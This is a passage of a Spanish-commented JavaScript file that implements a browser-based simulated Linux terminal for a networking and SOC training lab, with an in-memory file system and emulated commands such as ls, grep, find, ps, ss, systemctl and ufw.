"use strict";
// ======================================================================
// NetLab — Terminal de Linux simulada (todo en el navegador, no toca tu PC)
// Un sistema de archivos en memoria + los comandos más usados en redes y SOC.
// ======================================================================
const Linux = (() => {
  // ---------------------------------------------------------------- sistema de archivos
  const dir = (o = "alumno", m = "755") => ({ t: "d", c: {}, o, m });
  const arch = (d = "", o = "alumno", m = "644") => ({ t: "f", d, o, m });

  function nuevoSistema() {
    const raiz = dir("root");
    const sh = { raiz, cwd: "/home/alumno", user: "alumno", home: "/home/alumno", hist: [], salidas: [],
      host: "netlab", servicios: { ssh: { activo: true, habilitado: true }, apache2: { activo: false, habilitado: false },
        ufw: { activo: false, habilitado: false }, cron: { activo: true, habilitado: true } },
      paquetes: new Set(["openssh-server", "coreutils", "grep", "iproute2", "curl"]),
      usuarios: ["root", "alumno", "www-data"], ufw: [], procesos: null, env: {}, args: [], crontab: "" };
    for (const p of ["/bin", "/etc", "/tmp", "/var", "/var/log", "/var/www", "/home", "/root", "/usr", "/usr/bin"]) mkdirP(sh, p, "root");
    mkdirP(sh, "/home/alumno", "alumno");
    nodo(sh, "/tmp").m = "777";
    escribir(sh, "/etc/hostname", "netlab\n", "root");
    escribir(sh, "/etc/hosts", "127.0.0.1 localhost\n127.0.1.1 netlab\n192.168.1.1 router\n", "root");
    escribir(sh, "/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nalumno:x:1000:1000:Alumno:/home/alumno:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n", "root");
    escribir(sh, "/etc/shadow", "root:*:19000:0:99999:7:::\nalumno:$6$x:19000:0:99999:7:::\n", "root", "640");
    escribir(sh, "/etc/os-release", 'PRETTY_NAME="Ubuntu 24.04 LTS"\nNAME="Ubuntu"\nVERSION_ID="24.04"\n', "root");
    escribir(sh, "/home/alumno/.bashrc", "# configuración de bash\nalias ll='ls -la'\n");
    return sh;
  }

  function normPath(sh, p) {
    if (!p) return sh.cwd;
    if (p === "~" || p.startsWith("~/")) p = sh.home + p.slice(1);
    const partes = (p.startsWith("/") ? p : sh.cwd + "/" + p).split("/");
    const out = [];
    for (const x of partes) { if (!x || x === ".") continue; if (x === "..") out.pop(); else out.push(x); }
    return "/" + out.join("/");
  }
  function nodo(sh, ruta) {
    let n = sh.raiz;
    for (const x of ruta.split("/").filter(Boolean)) { if (!n || n.t !== "d") return null; n = n.c[x]; }
    return n || null;
  }
  const padre = (ruta) => ruta.replace(/\/[^/]+$/, "") || "/";
  const base = (ruta) => ruta.split("/").filter(Boolean).pop() || "/";
  function mkdirP(sh, ruta, o) {
    let n = sh.raiz;
    for (const x of ruta.split("/").filter(Boolean)) { n.c[x] = n.c[x] || dir(o || sh.user); n = n.c[x]; }
    return n;
  }
  function escribir(sh, ruta, texto, o, m) {
    const p = nodo(sh, padre(ruta)) || mkdirP(sh, padre(ruta), o);
    p.c[base(ruta)] = arch(texto, o || sh.user, m || "644");
  }
  const puedeEscribir = (sh, n) => sh.user === "root" || !n || n.o === sh.user || n.m.endsWith("7") || n.m.endsWith("6");
  const puedeLeer = (sh, n) => sh.user === "root" || n.o === sh.user || +n.m[2] >= 4;

  // ---------------------------------------------------------------- utilidades de comandos
  function opciones(args) {  // separa -abc / --x de los argumentos
    const op = new Set(), resto = [];
    let fin = false;
    for (const a of args) {
      if (!fin && a === "--") { fin = true; continue; }
      if (!fin && /^--\w/.test(a)) op.add(a.slice(2));
      else if (!fin && /^-[a-zA-Z]+$/.test(a)) for (const ch of a.slice(1)) op.add(ch);
      else resto.push(a);
    }
    return [op, resto];
  }
  const ok = (out = "") => ({ out, err: "", code: 0 });
  const mal = (err, code = 1) => ({ out: "", err: err + "\n", code });
  const lineas = (t) => { const l = t.split("\n"); if (l.at(-1) === "") l.pop(); return l; };
  const conNL = (t) => (t && !t.endsWith("\n") ? t + "\n" : t);

  function permisosTxt(n) {
    const r = (d) => ["---", "--x", "-w-", "-wx", "r--", "r-x", "rw-", "rwx"][+d];
    const t = (n.t === "d" ? "d" : "-") + [...n.m].map(r).join("");
    return n.suid ? t.slice(0, 3) + (t[3] === "x" ? "s" : "S") + t.slice(4) : t;
  }
  function leerArchivo(sh, a, cmd) {
    const ruta = normPath(sh, a), n = nodo(sh, ruta);
    if (!n) return [null, `${cmd}: ${a}: No existe el archivo o el directorio`];
    if (n.t === "d") return [null, `${cmd}: ${a}: Es un directorio`];
    if (!puedeLeer(sh, n)) return [null, `${cmd}: ${a}: Permiso denegado`];
    return [n.d, null];
  }
  function entradaTexto(sh, args, stdin, cmd) {  // texto de los archivos o de la tubería
    if (!args.length) return [stdin ?? "", null];
    let t = "";
    for (const a of args) { const [d, e] = leerArchivo(sh, a, cmd); if (e) return [null, e]; t += d; }
    return [t, null];
  }

  // ---------------------------------------------------------------- comandos
  const C = {};
  C.pwd = (a, i, sh) => ok(sh.cwd + "\n");
  C.whoami = (a, i, sh) => ok(sh.user + "\n");
  C.hostname = (a, i, sh) => ok(sh.host + "\n");
  C.id = (a, i, sh) => ok(sh.user === "root" ? "uid=0(root) gid=0(root) grupos=0(root)\n" : "uid=1000(alumno) gid=1000(alumno) grupos=1000(alumno),27(sudo)\n");
  C.date = () => ok(new Date().toString() + "\n");
  C.uname = (a) => ok(a.includes("-a") ? "Linux netlab 6.8.0-45-generic #45-Ubuntu SMP x86_64 GNU/Linux\n" : "Linux\n");
  C.clear = () => ok("\x0c");
  C.echo = (a) => { const [op, r] = opciones(a); const t = r.join(" "); return ok(op.has("n") ? t : t + "\n"); };
  C.printf = (a) => { let [f = "", ...r] = a; let k = 0;
    return ok(f.replace(/%[sd]/g, () => r[k++] ?? "").replace(/\\n/g, "\n").replace(/\\t/g, "\t")); };
  C.history = (a, i, sh) => ok(sh.hist.map((h, k) => `${String(k + 1).padStart(5)}  ${h}`).join("\n") + "\n");
  C.cd = (a, i, sh) => {
    const ruta = normPath(sh, a[0] || "~"), n = nodo(sh, ruta);
    if (!n) return mal(`cd: ${a[0]}: No existe el archivo o el directorio`);
    if (n.t !== "d") return mal(`cd: ${a[0]}: No es un directorio`);
    sh.cwd = ruta; return ok();
  };
  C.ls = (args, i, sh) => {
    const [op, r] = opciones(args);
    const objetivos = r.length ? r : ["."];
    const salida = [];
    for (const a of objetivos) {
      const ruta = normPath(sh, a), n = nodo(sh, ruta);
      if (!n) { salida.push(`ls: no se puede acceder a '${a}': No existe el archivo o el directorio`); continue; }
      let items = n.t === "d" ? Object.entries(n.c) : [[a, n]];
      if (!op.has("a") && !op.has("A")) items = items.filter(([k]) => !k.startsWith("."));
      items.sort(([x], [y]) => x.localeCompare(y));
      if (op.has("t") || op.has("r")) items.reverse();
      if (objetivos.length > 1) salida.push(`${a}:`);
      if (op.has("l")) {
        if (n.t === "d") salida.push(`total ${items.length * 4}`);
        if (op.has("a") && n.t === "d") items = [[".", n], ["..", n], ...items];
        for (const [k, x] of items) salida.push(`${permisosTxt(x)} 1 ${x.o.padEnd(8)} ${x.o.padEnd(8)} ${String(x.t === "d" ? 4096 : x.d.length).padStart(6)} nov 13 10:00 ${k}${x.t === "d" && op.has("F") ? "/" : ""}`);
      } else if (items.length) salida.push(items.map(([k, x]) => k + (x.t === "d" && op.has("F") ? "/" : "")).join("  "));
    }
    return { out: salida.filter((l) => !l.startsWith("ls:")).join("\n") + (salida.length ? "\n" : ""),
      err: salida.filter((l) => l.startsWith("ls:")).join("\n") + (salida.some((l) => l.startsWith("ls:")) ? "\n" : ""),
      code: salida.some((l) => l.startsWith("ls:")) ? 2 : 0 };
  };
  C.ll = (a, i, sh) => C.ls(["-la", ...a], i, sh);
  C.tree = (a, i, sh) => {
    const raiz = normPath(sh, a[0] || "."), n = nodo(sh, raiz);
    if (!n || n.t !== "d") return mal(`${a[0] || "."} [error al abrir el directorio]`);
    const out = [a[0] || "."]; let nd = 0, nf = 0;
    const rec = (x, pre) => {
      const e = Object.entries(x.c).filter(([k]) => !k.startsWith(".")).sort(([p], [q]) => p.localeCompare(q));
      e.forEach(([k, y], j) => { const ult = j === e.length - 1; out.push(pre + (ult ? "└── " : "├── ") + k);
        if (y.t === "d") { nd++; rec(y, pre + (ult ? "    " : "│   ")); } else nf++; });
    };
    rec(n, "");
    return ok(out.join("\n") + `\n\n${nd} directorios, ${nf} archivos\n`);
  };
  C.cat = (a, i, sh) => { const [op, r] = opciones(a); const [t, e] = entradaTexto(sh, r, i, "cat"); if (e) return mal(e);
    return ok(op.has("n") ? lineas(t).map((l, k) => `${String(k + 1).padStart(6)}\t${l}`).join("\n") + "\n" : t); };
  C.less = C.more = C.cat;
  C.head = (a, i, sh) => { let n = 10; const r = [];
    for (let k = 0; k < a.length; k++) { if (a[k] === "-n") n = +a[++k]; else if (/^-\d+$/.test(a[k])) n = +a[k].slice(1); else r.push(a[k]); }
    const [t, e] = entradaTexto(sh, r, i, "head"); if (e) return mal(e); return ok(lineas(t).slice(0, n).map((l) => l + "\n").join("")); };
  C.tail = (a, i, sh) => { let n = 10; const r = [];
    for (let k = 0; k < a.length; k++) { if (a[k] === "-n") n = +a[++k]; else if (/^-\d+$/.test(a[k])) n = +a[k].slice(1); else if (a[k] !== "-f") r.push(a[k]); }
    const [t, e] = entradaTexto(sh, r, i, "tail"); if (e) return mal(e); return ok(lineas(t).slice(-n).map((l) => l + "\n").join("")); };
  C.wc = (a, i, sh) => { const [op, r] = opciones(a); const [t, e] = entradaTexto(sh, r, i, "wc"); if (e) return mal(e);
    const l = lineas(t).length, w = t.split(/\s+/).filter(Boolean).length, c = t.length;
    const partes = op.size ? [op.has("l") && l, op.has("w") && w, op.has("c") && c].filter((x) => x !== false) : [l, w, c];
    return ok(partes.join(" ") + (r.length === 1 ? " " + r[0] : "") + "\n"); };
  C.grep = (a, i, sh) => {
    const r0 = [], op = new Set();
    for (const x of a) { if (/^-[a-zA-Z]+$/.test(x)) for (const ch of x.slice(1)) op.add(ch); else r0.push(x); }
    const [patron, ...archivos] = r0;
    if (patron === undefined) return mal("Uso: grep [OPCIÓN]... PATRONES [ARCHIVO]...", 2);
    let re; try { re = new RegExp(op.has("F") ? patron.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") : patron.replace(/\\\|/g, "|"), op.has("i") ? "i" : ""); }
    catch { return mal("grep: expresión regular inválida", 2); }
    let fuentes = [];
    if (!archivos.length) fuentes = [[null, i ?? ""]];
    for (const f of archivos) {
      const ruta = normPath(sh, f), n = nodo(sh, ruta);
      if (!n) return mal(`grep: ${f}: No existe el archivo o el directorio`, 2);
      if (n.t === "d") {
        if (!op.has("r") && !op.has("R")) return mal(`grep: ${f}: Es un directorio`, 2);
        const rec = (x, p) => Object.entries(x.c).forEach(([k, y]) => y.t === "d" ? rec(y, p + "/" + k) : fuentes.push([p + "/" + k, y.d]));
        rec(n, f.replace(/\/$/, ""));
      } else if (!puedeLeer(sh, n)) return mal(`grep: ${f}: Permiso denegado`, 2);
      else fuentes.push([f, n.d]);
    }
    const varios = fuentes.length > 1, out = [];
    let total = 0;
    for (const [nombre, t] of fuentes) {
      let c = 0;
      lineas(t).forEach((l, k) => { if (re.test(l) !== op.has("v")) { c++; if (op.has("c") || op.has("l")) return;
        const pre = (varios ? nombre + ":" : "") + (op.has("n") ? `${k + 1}:` : "");
        if (op.has("o") && !op.has("v")) for (const m of l.matchAll(new RegExp(re.source, re.flags + "g"))) out.push(pre + m[0]);
        else out.push(pre + l); } });
      if (op.has("c")) out.push((varios ? nombre + ":" : "") + c);
      if (op.has("l") && c) out.push(nombre);
      total += c;
    }
    return { out: out.length ? out.join("\n") + "\n" : "", err: "", code: total || op.has("c") ? 0 : 1 };
  };
  C.sort = (a, i, sh) => { const [op, r] = opciones(a); const [t, e] = entradaTexto(sh, r, i, "sort"); if (e) return mal(e);
    let l = lineas(t); l.sort(op.has("n") ? (x, y) => parseFloat(x) - parseFloat(y) : (x, y) => x.localeCompare(y));
    if (op.has("r")) l.reverse(); if (op.has("u")) l = [...new Set(l)]; return ok(l.map((x) => x + "\n").join("")); };
  C.uniq = (a, i, sh) => { const [op, r] = opciones(a); const [t, e] = entradaTexto(sh, r, i, "uniq"); if (e) return mal(e);
    const out = []; for (const l of lineas(t)) { if (out.length && out.at(-1)[0] === l) out.at(-1)[1]++; else out.push([l, 1]); }
    return ok(out.map(([l, n]) => (op.has("c") ? `${String(n).padStart(7)} ` : "") + l + "\n").join("")); };
  C.cut = (a, i, sh) => { let d = "\t", f = ""; const r = [];
    for (let k = 0; k < a.length; k++) { const x = a[k];
      if (x === "-d") d = a[++k]; else if (x.startsWith("-d")) d = x.slice(2); else if (x === "-f") f = a[++k]; else if (x.startsWith("-f")) f = x.slice(2); else r.push(x); }
    if (!f) return mal("cut: debe especificar una lista de campos (-f)");
    const [t, e] = entradaTexto(sh, r, i, "cut"); if (e) return mal(e);
    const campos = f.split(",").flatMap((p) => { const [x, y] = p.split("-").map(Number); return y ? Array.from({ length: y - x + 1 }, (_, k) => x + k) : [x]; });
    return ok(lineas(t).map((l) => { const p = l.split(d); return campos.map((c) => p[c - 1]).filter((x) => x !== undefined).join(d); }).join("\n") + "\n"); };
  C.tr = (a, i) => { const [x, y] = a; if (x === "-d") return ok((i || "").split("").filter((c) => !y.includes(c)).join(""));
    const ex = (s) => s.replace(/a-z/, "abcdefghijklmnopqrstuvwxyz").replace(/A-Z/, "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
    const X = ex(x || ""), Y = ex(y || ""); return ok((i || "").split("").map((c) => { const k = X.indexOf(c); return k < 0 ? c : Y[Math.min(k, Y.length - 1)]; }).join("")); };
  C.mkdir = (a, i, sh) => { const [op, r] = opciones(a); if (!r.length) return mal("mkdir: falta un operando");
    for (const x of r) { const ruta = normPath(sh, x);
      if (nodo(sh, ruta)) { if (!op.has("p")) return mal(`mkdir: no se puede crear el directorio «${x}»: El archivo ya existe`); continue; }
      const p = nodo(sh, padre(ruta));
      if (!p && !op.has("p")) return mal(`mkdir: no se puede crear el directorio «${x}»: No existe el archivo o el directorio`);
      if (p && !puedeEscribir(sh, p)) return mal(`mkdir: no se puede crear el directorio «${x}»: Permiso denegado`);
      mkdirP(sh, ruta); }
    return ok(); };
  C.touch = (a, i, sh) => { if (!a.length) return mal("touch: falta un operando");
    for (const x of a) { const ruta = normPath(sh, x); if (nodo(sh, ruta)) continue; const p = nodo(sh, padre(ruta));
      if (!p) return mal(`touch: no se puede efectuar 'touch' sobre '${x}': No existe el archivo o el directorio`);
      if (!puedeEscribir(sh, p)) return mal(`touch: no se puede efectuar 'touch' sobre '${x}': Permiso denegado`);
      p.c[base(ruta)] = arch("", sh.user); }
    return ok(); };
  C.rm = (a, i, sh) => { const [op, r] = opciones(a); if (!r.length) return mal("rm: falta un operando");
    for (const x of r) { const ruta = normPath(sh, x), n = nodo(sh, ruta);
      if (!n) { if (op.has("f")) continue; return mal(`rm: no se puede borrar '${x}': No existe el archivo o el directorio`); }
      if (n.t === "d" && !op.has("r") && !op.has("R")) return mal(`rm: no se puede borrar '${x}': Es un directorio`);
      const p = nodo(sh, padre(ruta)); if (!puedeEscribir(sh, p)) return mal(`rm: no se puede borrar '${x}': Permiso denegado`);
      delete p.c[base(ruta)]; }
    return ok(); };
  C.rmdir = (a, i, sh) => { for (const x of a) { const ruta = normPath(sh, x), n = nodo(sh, ruta);
      if (!n) return mal(`rmdir: fallo al borrar '${x}': No existe el archivo o el directorio`);
      if (n.t !== "d") return mal(`rmdir: fallo al borrar '${x}': No es un directorio`);
      if (Object.keys(n.c).length) return mal(`rmdir: fallo al borrar '${x}': El directorio no está vacío`);
      delete nodo(sh, padre(ruta)).c[base(ruta)]; } return ok(); };
  const clonar = (n) => JSON.parse(JSON.stringify(n));
  function copiarMover(a, sh, mover) {
    const cmd = mover ? "mv" : "cp";
    const [op, r] = opciones(a); if (r.length < 2) return mal(`${cmd}: falta el archivo de destino`);
    const destino = r.pop(), rd = normPath(sh, destino), nd = nodo(sh, rd);
    if (r.length > 1 && (!nd || nd.t !== "d")) return mal(`${cmd}: el destino '${destino}' no es un directorio`);
    for (const x of r) {
      const ruta = normPath(sh, x), n = nodo(sh, ruta);
      if (!n) return mal(`${cmd}: no se puede efectuar \`stat' sobre '${x}': No existe el archivo o el directorio`);
      if (n.t === "d" && !mover && !op.has("r") && !op.has("R")) return mal(`cp: -r no especificado; se omite el directorio '${x}'`);
      const final = nd && nd.t === "d" ? rd + "/" + base(ruta) : rd;
      const p = nodo(sh, padre(final)); if (!p) return mal(`${cmd}: no se puede crear '${destino}': No existe el archivo o el directorio`);
      if (!puedeEscribir(sh, p)) return mal(`${cmd}: no se puede crear '${destino}': Permiso denegado`);
      const copia = clonar(n); if (!mover) copia.o = sh.user;
      p.c[base(final)] = copia;
      if (mover) delete nodo(sh, padre(ruta)).c[base(ruta)];
    }
    return ok();
  }
  C.cp = (a, i, sh) => copiarMover(a, sh, false);
  C.mv = (a, i, sh) => copiarMover(a, sh, true);
  C.find = (a, i, sh) => {
    let inicio = ".", k = 0; if (a[0] && !a[0].startsWith("-")) { inicio = a[0]; k = 1; }
    let nombre = null, tipo = null, iname = false, suid = false;
    for (; k < a.length; k++) {
      if (a[k] === "-name" || a[k] === "-iname") { iname = a[k] === "-iname"; nombre = a[++k]; }
      else if (a[k] === "-type") tipo = a[++k];
      else if (a[k] === "-perm") { const v = a[++k] || ""; if (/^[-/]?(u=s|4000|4[0-7]{3})$/.test(v)) suid = true; else return mal(`find: en este lab -perm solo entiende -4000 o -u=s (SUID)`); } }
    const rx = nombre && new RegExp("^" + nombre.replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*").replace(/\?/g, ".") + "$", iname ? "i" : "");
    const n0 = nodo(sh, normPath(sh, inicio)); if (!n0) return mal(`find: '${inicio}': No existe el archivo o el directorio`);
    const out = [], rec = (x, p, nom) => {
      if ((!rx || rx.test(nom)) && (!tipo || (tipo === "d") === (x.t === "d")) && (!suid || x.suid)) out.push(p);
      if (x.t === "d") Object.entries(x.c).sort(([p1], [p2]) => p1.localeCompare(p2)).forEach(([kk, y]) => rec(y, p.replace(/\/$/, "") + "/" + kk, kk)); };
    rec(n0, inicio, base(normPath(sh, inicio)));
    return ok(out.length ? out.join("\n") + "\n" : "");
  };
  C.chmod = (a, i, sh) => { const [modo, ...r] = a.filter((x) => x !== "-R"); if (!r.length) return mal("chmod: falta un operando");
    for (const x of r) { const n = nodo(sh, normPath(sh, x));
      if (!n) return mal(`chmod: no se puede acceder a '${x}': No existe el archivo o el directorio`);
      if (sh.user !== "root" && n.o !== sh.user) return mal(`chmod: cambiando los permisos de '${x}': Operación no permitida`);
      if (/^[0-7]{3}$/.test(modo)) { n.m = modo; n.suid = false; }
      else if (/^[0-7]{4}$/.test(modo)) { n.m = modo.slice(1); n.suid = (+modo[0] & 4) > 0; }
      else if (/^[ua]*[+\-]s$/.test(modo)) n.suid = modo.includes("+");
      else { const m = modo.match(/^([ugoa]*)([+\-=])([rwx]+)$/); if (!m) return mal(`chmod: modo inválido: '${modo}'`);
        const quien = (m[1] || "a").replace("a", "ugo"), bits = [...m[3]].reduce((s, c) => s + { r: 4, w: 2, x: 1 }[c], 0);
        n.m = [..."ugo"].map((q, j) => { let v = +n.m[j]; if (quien.includes(q)) v = m[2] === "+" ? v | bits : m[2] === "-" ? v & ~bits : bits; return v; }).join(""); } }
    return ok(); };
  C.chown = (a, i, sh) => { const [quien, ...r] = a.filter((x) => x !== "-R");
    if (sh.user !== "root") return mal(`chown: cambiando el propietario de '${r[0]}': Operación no permitida`);
    for (const x of r) { const n = nodo(sh, normPath(sh, x)); if (!n) return mal(`chown: no se puede acceder a '${x}'`); n.o = quien.split(":")[0]; }
    return ok(); };
  C.which = (a) => ok(a.filter((x) => C[x]).map((x) => `/usr/bin/${x}`).join("\n") + (a.some((x) => C[x]) ? "\n" : ""));
  C.man = (a) => AYUDA[a[0]] ? ok(`${a[0].toUpperCase()}(1)\n\n${AYUDA[a[0]]}\n`) : mal(`No hay entrada de manual para ${a[0] || "?"}`, 16);
  C.help = () => ok("Comandos disponibles:\n" + Object.keys(AYUDA).sort().join("  ") + "\n\nUsa 'man comando' para ver qué hace cada uno.\n");
  C.ps = (a, i, sh) => ok(procesos(sh).map((p) => a.join("").includes("aux") ? `${p.u.padEnd(9)}${String(p.pid).padStart(6)}  0.0  0.1 ${p.cmd}` : `${String(p.pid).padStart(7)} pts/0    00:00:00 ${p.cmd.split(" ")[0].split("/").pop()}`)
    .reduce((s, l) => s + l + "\n", a.join("").includes("aux") ? "USER        PID %CPU %MEM COMMAND\n" : "    PID TTY          TIME CMD\n"));
  C.kill = (a, i, sh) => { const pid = +a.filter((x) => !x.startsWith("-"))[0]; const p = procesos(sh).find((x) => x.pid === pid);
    if (!p) return mal(`kill: (${pid}) - No existe el proceso`);
    if (p.u !== sh.user && sh.user !== "root") return mal(`kill: (${pid}) - Operación no permitida`);
    sh.procesos = sh.procesos.filter((x) => x.pid !== pid); return ok(); };
  function procesos(sh) {
    if (!sh.procesos) sh.procesos = [{ pid: 1, u: "root", cmd: "/sbin/init" }, { pid: 612, u: "root", cmd: "/usr/sbin/cron -f" },
      { pid: 845, u: "root", cmd: "sshd: /usr/sbin/sshd -D" }, { pid: 1203, u: "alumno", cmd: "-bash" }];
    const svc = Object.entries(sh.servicios).filter(([k, v]) => v.activo && k === "apache2").map(([k], j) => ({ pid: 1500 + j, u: "www-data", cmd: "/usr/sbin/apache2 -k start" }));
    const pre = nodo(sh, "/etc/ld.so.preload"), oculta = !!(pre && pre.t !== "d" && pre.d.trim());  // un rootkit de LD_PRELOAD esconde procesos
    return [...sh.procesos.filter((p) => !(oculta && p.oculto)), ...svc];
  }
  C.ip = (a) => { const s = a.join(" ");
    if (/^(a|addr|address)/.test(s)) return ok("1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    link/ether 08:00:27:3a:5c:1e brd ff:ff:ff:ff:ff:ff\n    inet 192.168.1.50/24 brd 192.168.1.255 scope global dynamic eth0\n");
    if (/^(r|route)/.test(s)) return ok("default via 192.168.1.1 dev eth0 proto dhcp\n192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.50\n");
    if (/^(l|link)/.test(s)) return ok("1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 state UNKNOWN\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP\n");
    return mal("Uso: ip [ addr | route | link ]"); };
  C.ifconfig = () => ok("eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.1.50  netmask 255.255.255.0  broadcast 192.168.1.255\n        ether 08:00:27:3a:5c:1e\n");
  const VIVOS = { "192.168.1.1": 1, router: 1, "8.8.8.8": 18, "1.1.1.1": 12, "google.com": 21, localhost: 0.05, "127.0.0.1": 0.05 };
  C.ping = (a) => { const [op] = opciones(a); const dst = a.filter((x) => !x.startsWith("-") && !/^\d+$/.test(x)).pop();
    if (!dst) return mal("ping: falta el destino"); const ms = VIVOS[dst]; const n = op.has("c") ? +a[a.indexOf("-c") + 1] || 4 : 4;
    if (ms === undefined) return { out: `PING ${dst} 56(84) bytes of data.\n\n--- ${dst} ping statistics ---\n${n} packets transmitted, 0 received, 100% packet loss\n`, err: "", code: 1 };
    return ok(`PING ${dst} 56(84) bytes of data.\n` + Array.from({ length: n }, (_, k) => `64 bytes from ${dst}: icmp_seq=${k + 1} ttl=${ms > 1 ? 117 : 64} time=${(ms + Math.random()).toFixed(1)} ms\n`).join("") + `\n--- ${dst} ping statistics ---\n${n} packets transmitted, ${n} received, 0% packet loss\n`); };
  C.ss = (a, i, sh) => { const l = ["Netid State  Local Address:Port  Process"];
    if (sh.servicios.ssh.activo) l.push('tcp   LISTEN 0.0.0.0:22          users:(("sshd",pid=845))');
    if (sh.servicios.apache2.activo) l.push('tcp   LISTEN 0.0.0.0:80          users:(("apache2",pid=1500))');
    for (const p of procesos(sh).filter((x) => x.red)) l.push(`tcp   ESTAB  192.168.1.50:${p.puerto || 51234}  ${p.red}  users:(("${p.cmd.split(" ")[0].split("/").pop()}",pid=${p.pid}))`);
    l.push('udp   UNCONN 127.0.0.53%lo:53     users:(("systemd-resolve",pid=402))');
    return ok(l.join("\n") + "\n"); };
  C.netstat = C.ss;
  C.curl = (a, i, sh) => { const u = a.filter((x) => !x.startsWith("-")).pop() || "";
    if (/localhost|127\.0\.0\.1/.test(u)) return sh.servicios.apache2.activo ? ok("<h1>It works!</h1>\n") : mal(`curl: (7) Failed to connect to localhost port 80: Conexión rehusada`, 7);
    return ok("<html>…</html>\n"); };
  C.systemctl = (a, i, sh) => { const [acc, svc0] = a; const svc = (svc0 || "").replace(/\.service$/, ""); const s = sh.servicios[svc];
    if (!acc) return mal("Uso: systemctl [status|start|stop|restart|enable|disable] SERVICIO");
    if (!s) return mal(`Unit ${svc0}.service could not be found.`, 4);
    if (acc === "status") return { out: `● ${svc}.service\n     Loaded: loaded (/lib/systemd/system/${svc}.service; ${s.habilitado ? "enabled" : "disabled"})\n     Active: ${s.activo ? "active (running)" : "inactive (dead)"}\n`, err: "", code: s.activo ? 0 : 3 };
    if (sh.user !== "root") return mal(`Failed to ${acc} ${svc}.service: Access denied (usa sudo)`);
    if (acc === "start" || acc === "restart") s.activo = true; else if (acc === "stop") s.activo = false;
    else if (acc === "enable") s.habilitado = true; else if (acc === "disable") s.habilitado = false; else return mal(`Acción desconocida: ${acc}`);
    return ok(); };
  C.service = (a, i, sh) => C.systemctl([a[1], a[0]], i, sh);
  C.apt = (a, i, sh) => { const [acc, ...pk] = a.filter((x) => x !== "-y");
    if (acc === "update") return sh.user === "root" ? ok("Obj:1 http://archive.ubuntu.com noble InRelease\nLeyendo lista de paquetes... Hecho\n") : mal("E: No se pudo abrir el archivo de bloqueo - open (13: Permiso denegado)\nE: ¿Es usted root?", 100);
    if (acc === "install" || acc === "remove") { if (sh.user !== "root") return mal("E: No se pudo abrir el archivo de bloqueo - open (13: Permiso denegado)\nE: ¿Es usted root?", 100);
      for (const p of pk) { if (acc === "install") { sh.paquetes.add(p); if (p === "apache2") sh.servicios.apache2 = { activo: true, habilitado: true };
        if (p === "nmap") C.nmap = NMAP; } else sh.paquetes.delete(p); }
      return ok(`Leyendo lista de paquetes... Hecho\n${acc === "install" ? "Configurando" : "Desinstalando"} ${pk.join(" ")} ...\n`); }
    if (acc === "list" ) return ok([...sh.paquetes].sort().map((p) => `${p}/noble,now [instalado]`).join("\n") + "\n");
    return mal("Uso: apt [update|install|remove|list] paquete"); };
  C["apt-get"] = C.apt;
  const NMAP = (a) => ok(`Starting Nmap 7.94\nNmap scan report for ${a.filter((x) => !x.startsWith("-")).pop() || "?"}\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n`);
  C.ufw = (a, i, sh) => { if (sh.user !== "root") return mal("ERROR: Necesitas ser root para ejecutar este script");
    const s = a.join(" ");
    if (s === "enable") { sh.servicios.ufw.activo = true; return ok("El cortafuegos está activo y habilitado en el arranque del sistema\n"); }
    if (s === "disable") { sh.servicios.ufw.activo = false; return ok("El cortafuegos está detenido y deshabilitado\n"); }
    if (/^(allow|deny) /.test(s)) { if (!sh.ufw.includes(s)) sh.ufw.push(s); return ok(sh.servicios.ufw.activo ? "Regla añadida\n" : "Regla añadida (ojo: ufw está inactivo; actívalo con ufw enable)\n"); }
    if (s.startsWith("status")) return ok(`Estado: ${sh.servicios.ufw.activo ? "activo" : "inactivo"}\n` + sh.ufw.map((r) => {
      const m = r.match(/^(allow|deny) (?:from (\S+)(?: to any)?|(\S+))/); return `${(m?.[3] || "Anywhere").padEnd(16)} ${m?.[1].toUpperCase().padEnd(6)} ${m?.[2] || "Anywhere"}`; }).join("\n") + "\n");
    if (/^delete (allow|deny) /.test(s)) { const r = s.slice(7); const n = sh.ufw.length; sh.ufw = sh.ufw.filter((x) => x !== r); return n === sh.ufw.length ? mal("No se encontró la regla") : ok("Regla eliminada\n"); }
    return mal("Uso: ufw [enable|disable|status|allow PUERTO|deny PUERTO|deny from IP|delete REGLA]"); };
  C.userdel = (a, i, sh) => { if (sh.user !== "root") return mal("userdel: Permiso denegado.");
    const u = a.filter((x) => !x.startsWith("-")).pop(); const n = nodo(sh, "/etc/passwd");
    if (!u || !n.d.split("\n").some((l) => l.startsWith(u + ":"))) return mal(`userdel: el usuario «${u}» no existe`, 6);
    n.d = n.d.split("\n").filter((l) => !l.startsWith(u + ":")).join("\n"); sh.usuarios = sh.usuarios.filter((x) => x !== u);
    if (a.includes("-r")) { const h = nodo(sh, "/home"); delete h.c[u]; } return ok(); };
  const bloquear = (a, sh, cmd) => { if (sh.user !== "root") return mal(`${cmd}: Permiso denegado.`);
    const u = a.filter((x) => !x.startsWith("-")).pop();
    if (!u || !nodo(sh, "/etc/passwd").d.split("\n").some((l) => l.startsWith(u + ":"))) return mal(`${cmd}: el usuario «${u}» no existe`);
    sh.bloqueados = sh.bloqueados || new Set(); sh.bloqueados.add(u); return ok(cmd === "passwd" ? `passwd: información de caducidad de la contraseña cambiada.\n` : ""); };
  C.usermod = (a, i, sh) => a.includes("-L") ? bloquear(a, sh, "usermod") : mal("En este lab: usermod -L usuario (bloquea la cuenta)");
  C.passwd = (a, i, sh) => a.includes("-l") ? bloquear(a, sh, "passwd") : mal("En este lab: passwd -l usuario (bloquea la cuenta)");
  C.pkill = (a, i, sh) => { const pat = a.filter((x) => !x.startsWith("-")).pop(); if (!pat) return mal("uso: pkill [-f] patrón");
    const lista = procesos(sh).filter((p) => p.cmd.includes(pat) && p.pid > 1);
